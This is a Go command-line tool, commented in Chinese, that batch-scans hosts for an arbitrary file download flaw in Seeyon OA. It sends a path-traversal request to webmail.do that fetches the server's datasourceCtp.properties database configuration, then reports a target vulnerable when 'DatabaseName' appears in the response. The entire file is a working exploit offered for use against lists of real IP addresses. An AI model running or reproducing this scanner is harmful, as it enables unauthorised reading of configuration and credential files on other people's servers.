package main

import(
	"os"
	"fmt"
	"flag"
	"bufio"
	"regexp"
	"io/ioutil"
	"net/http"
)


var (
	url string
	urltxt string
)







func main() {
	// 加载命令行交互
	flag.StringVar(&url, "u", "", "输入查询网址(ip:端口): -u   120.197.184.83:8089 ")
	flag.StringVar(&urltxt, "t", "", "批量查询(ip:端口): -t  xxxx.txt")
	flag.Usage = usage
	flag.Parse()
	if url == "" && urltxt == "" {
		flag.Usage()
		os.Exit(0)
	}

	if urltxt != "" {
		// 读取文件批量测试
		urls, number, error := readLines(urltxt)
		if error != nil {
			fmt.Println("读取文件错误 ！")
			os.Exit(0)
		}


		fmt.Println(number)

		for _,urlss := range urls{
			//fmt.Println(urlss)
			oapayloadtest(urlss)
		}

	}


	if url != "" {
		oapayloadtest(url)
	}
	//oapayloadtest(url)


}



func usage() {
    flag.PrintDefaults()
}


func urlpayload(url string ) string {
	url = "http://"+url+"/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties"
	return url
}






func oaRequest(url string) []byte {
	resp, err := http.Get(url)
	resp.Header.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)")
	defer resp.Body.Close()
	if err != nil {
		fmt.Println("HTTP GET ",err)
		os.Exit(0)
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("HTTP READ ",err)
		os.Exit(0)
	}

	return body

}





func istruepoc(report string, url string) {
	// 判断是否存在关键字符
	matched, err := regexp.MatchString("DatabaseName", report)
	if err != nil {
		fmt.Println("正则匹配错误 ！ ",err)
		os.Exit(0)		
	}

	if matched {
		fmt.Println(url+"存在任意文件下载漏洞 ！")
	} else {
		fmt.Println(url+"漏洞不存在 ！")
	}

}


func oapayloadtest(url string) {
	// 处理网址
	urldownload := urlpayload(url)
	// 发送请求，接受结果
	results := oaRequest(urldownload)
	// 判断是否存在问题
	istruepoc(string(results),url)	
}


func readLines(path string) ([]string, int, error) {
  file, err := os.Open(path)
  if err != nil {
    return nil,0, err
  }
  defer file.Close()

  var lines []string
  linecount :=0
  scanner := bufio.NewScanner(file)
  for scanner.Scan() {
    lines = append(lines, scanner.Text())
    linecount++
  }
  return lines,linecount,scanner.Err()
}

